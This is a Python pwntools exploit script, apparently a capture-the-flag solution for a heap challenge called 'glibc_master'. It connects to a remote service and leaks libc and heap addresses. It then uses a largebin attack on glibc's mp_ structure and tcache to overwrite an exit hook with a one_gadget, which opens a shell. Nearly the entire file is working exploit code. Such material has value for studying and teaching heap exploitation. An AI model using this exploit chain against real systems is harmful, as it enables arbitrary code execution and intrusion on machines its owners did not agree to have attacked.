# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './glibc_master'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
# context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
else:
    host = '123.56.146.210'
    port = '43275'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a = 6      : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a = 4      : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(index , size):
    cmd(1)
    sla('index:' , index)
    sla('size:' , size)

def edit(idx , text):
    cmd(2)
    sla('index:' , idx)
    sa('context:' , text)

def show(idx ):
    cmd(3)
    sla('index:' , idx)

def delete(idx ):
    cmd(4)
    sla('index:' , idx)

def attack():
    
    add(0 , 0x428)
    add(1 , 0x410)
    add(2 , 0x418)
    add(3 , 0x410)
    delete(0)
    show(0)

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    libc_base = libc.address
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    mp_ = 0x1ec280 + libc_base
    lg('__free_hook',__free_hook)

    # dbg()
    delete(2)
    show(2)
    rl()
    heap_addr = uu64(6)

    delete(1)
    add(10 , 0x600)
    add(11 , 0x600)
    # dbg()
    delete(11)
    delete(10)
    add(12 ,0x428)
    add(13 ,0x410)
    add(14 ,0x418)

    delete(0)
    add(15 , 0x438)
    delete(2)

    lg('mp_',mp_)

    payload =  flat(0 ,libc_base + 0x1ebfd0 ,heap_addr,mp_+80-0x20 , 0 )+'\n'
    edit(0 ,payload)
    add(6,0x450)

    # dbg('free')
    delete(3)
    delete(1)

    exit_hook = 0x222060 + libc_base + 3848
    ogg = 0xe3b2e + libc_base
    #  [r15] == NULL || r15 == NULL
    #  [r12] == NULL || r12 == NULL

    edit(10 , flat(exit_hook - 0x8,exit_hook - 0x8)*0x60 + '\n')

    add(7 , 0x410)
    add(8 , 0x410)

    edit(8 , flat(0 , ogg , ogg) + '\n')

    # dbg('exit')
    # delete()
    delete(99)
    # dbg()


    p.interactive()

attack()

'''
@File    :   glibc_master.py
@Time    :   2022/08/23 14:15:42
@Author  :   Niyah 
'''